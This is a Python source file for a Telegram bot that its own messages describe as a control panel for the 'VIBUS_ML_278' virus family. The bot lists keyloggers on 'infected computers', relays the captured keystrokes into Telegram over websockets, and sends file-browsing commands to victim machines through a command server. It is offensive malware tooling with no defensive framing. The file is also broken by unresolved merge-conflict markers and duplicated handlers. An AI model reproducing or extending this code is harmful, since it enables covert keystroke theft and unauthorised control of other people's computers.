import asyncio
import aiohttp
from aiogram import Bot, Dispatcher
from aiogram.filters import CommandStart, StateFilter
from aiogram.types import Message, CallbackQuery
from config import TOKEN
from aiogram.utils.keyboard import InlineKeyboardBuilder, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import websockets
<<<<<<< HEAD
import json
=======
>>>>>>> a6a076d2c779859ce9b613cfd473fd662a56b957


def keyboard_builder(width, *args):
    buttons = list(map(lambda x: InlineKeyboardButton(text=x, callback_data=x), args))
    kb_builder = InlineKeyboardBuilder()
    kb_builder.row(*buttons, width=width)
    return kb_builder.as_markup(resize_keyboard=True)


bot = Bot(token=TOKEN)
dp = Dispatcher()


class KeyloggerStates(StatesGroup):
    start_listening = State()


<<<<<<< HEAD
class FileManagerStates(StatesGroup):
    start_files = State()
    navigate = State()


async def main():
=======
async def main() :
>>>>>>> a6a076d2c779859ce9b613cfd473fd662a56b957
    await dp.start_polling(bot)

WEBHOOK_URL = 'http://192.168.0.108:8000/send-command'


async def send_post_request(data: dict):
    """Функция для отправки POST-запроса на внешний сервер"""
    async with aiohttp.ClientSession() as session:
        async with session.post(WEBHOOK_URL, json=data) as response:
            if response.status == 200:
                print("POST запрос успешно отправлен")
                global data_d
                data_d =  await response.json()  # Возвращает JSON-ответ
                print(data_d)
                return data_d
            else:
                print(f"Ошибка: {response.status}")
                return None

@dp.message(CommandStart())
async def cmd_start(message: Message):
<<<<<<< HEAD
    await message.answer(
        'Приветствую! Ты в боте для управления вирусами "VIBUS_ML_278"! '
        'Ты можешь управлять зараженными компьютерами и их файлами!'
    )
    keyboard = keyboard_builder(
        2, "Зараженные компьютеры", "Файлы", "Инструкция", "Слова авторов"
    )
    await message.answer(text="Что делаем?", reply_markup=keyboard)



@dp.callback_query(lambda call: call.data == "Зараженные компьютеры")
async def get_keyloggers(callback: CallbackQuery, state: FSMContext):
    url = "http://127.0.0.1:8000/check_keyloggers"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            data = await response.json()
            total = data["total"]
    if total:
        await callback.message.answer(
            text=f"Всего доступно {total} кейлоггеров. "
                 f"Введите число от 1 до {total}, чтобы подключиться."
        )
        await state.set_state(KeyloggerStates.start_listening)
    else:
        await callback.message.answer("В данный момент нет доступных кейлоггеров.")


async def consumer_handler(websocket, message: Message):
    async for word in websocket:
        await message.answer(text=word)


@dp.message(lambda mes: mes.text.isdigit(), StateFilter(KeyloggerStates.start_listening))
async def connect_keylogger(message: Message):
    user_choice = int(message.text)
    url = f'ws://192.168.0.108:8000/ws/listen/keylogger/{user_choice}'

    async with websockets.connect(url) as websocket:
        await consumer_handler(websocket, message)


@dp.callback_query(lambda call: call.data == "Файлы")
async def manage_files(callback: CallbackQuery, state: FSMContext):
    url = "http://192.168.0.108:8000/check_files"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            data = await response.json()
            total = data["total"]
    if total:
        await callback.message.answer(
            text=f"Всего доступно {total} клиентов. "
                 f"Введите число от 1 до {total}, чтобы начать управление файлами."
        )
        await state.set_state(FileManagerStates.start_files)
    else:
        await callback.message.answer("Нет доступных клиентов для работы с файлами.")


@dp.message(lambda mes: mes.text.isdigit(), StateFilter(FileManagerStates.start_files))
async def connect_file_manager(message: Message, state: FSMContext):
    user_choice = int(message.text)
    url = f'ws://192.168.0.108:8000/ws/listen/files_pc/123'
    await state.update_data(file_ws_url=url)

    keyboard = keyboard_builder(2, "Отправить команду", "Навигация по папкам")
    await message.answer("Выберите действие:", reply_markup=keyboard)
    await state.set_state(FileManagerStates.navigate)


@dp.callback_query(lambda call: call.data == "Отправить команду", StateFilter(FileManagerStates.navigate))
async def send_command(callback: CallbackQuery, state: FSMContext):
    """Обработка выбора отправки команды"""
    keyboard = keyboard_builder(
        2, "list_drives", "list_directory", "navigate", "exit"
    )
    await callback.message.answer("Выберите команду для отправки:", reply_markup=keyboard)

@dp.callback_query(lambda call: call.data == "Отправить команду", StateFilter(FileManagerStates.navigate))
async def send_command(callback: CallbackQuery, state: FSMContext):
    """Обработка выбора отправки команды"""
    keyboard = keyboard_builder(
        2, "Команда 1", "Команда 2", "Команда 3", "Отмена"
    )
    await callback.message.answer("Выберите команду для отправки:", reply_markup=keyboard)


@dp.callback_query(StateFilter(FileManagerStates.navigate))
async def handle_file_actions(callback: CallbackQuery, state: FSMContext):
    """Обработка выбранной команды"""
    action = callback.data

    if action == "Отмена":
        await callback.message.answer("Действие отменено.")
        return

    state_data = await state.get_data()
    ws_url = state_data.get("file_ws_url")

    # Формирование данных для POST-запроса
    data = {
        "command": action,
        "path": "E:\\"  # Здесь можно настроить динамическое изменение пути
    }

    # Отправка POST-запроса
    response = await send_post_request(data)
    if response:
        server_message = response.get("message", "Нет сообщения от сервера")
        await callback.message.answer(f"✅ {data_d["data"]}")
    else:
        await callback.message.answer(f"❌ Не удалось отправить команду '{action}'. Проверьте соединение.")


=======
    await message.answer('Приветствую тебя в боте для управления самого мощного семейство вирусов "VIBUS_ML_278" ! Ну а раз ты уже здесь то ты достоин !!!')
    keyboard = keyboard_builder(4, "Зараженные компьютеры", "Инструкция", "Слова авторов", "Прослушка")
    await message.answer(text="что делаем ?", reply_markup=keyboard)
>>>>>>> a6a076d2c779859ce9b613cfd473fd662a56b957


@dp.callback_query(lambda call: call.data == "Прослушка")
async def get_keyloggers(callback: CallbackQuery, state: FSMContext):
    url = "http://127.0.0.1:8000/check_keyloggers"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            data = await response.json()
            total = data["total"]
    if total:
        await callback.message.answer(text=f"Всего доступно {total} кейлоггеров \n"
                                           f" Выбери тот, к которому хочешь подключиться"
                                           f"Введи число от 1 до {total}")
        await state.set_state(KeyloggerStates.start_listening)
    else:
        await callback.message.answer("В данный момент нет доступных кейлоггеров(")


async def consumer_handler(websocket, message: Message):
    async for word in websocket:
        await message.answer(text=word)


@dp.message(lambda mes: mes.text.isdigit(), StateFilter(KeyloggerStates.start_listening))
async def connect_keylogger(message: Message):
    user_choice = int(message.text)
    url = f'ws://localhost:8000/ws/listen/{user_choice}'

    async with websockets.connect(url) as websocket:
        await consumer_handler(websocket, message)


if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('Exit')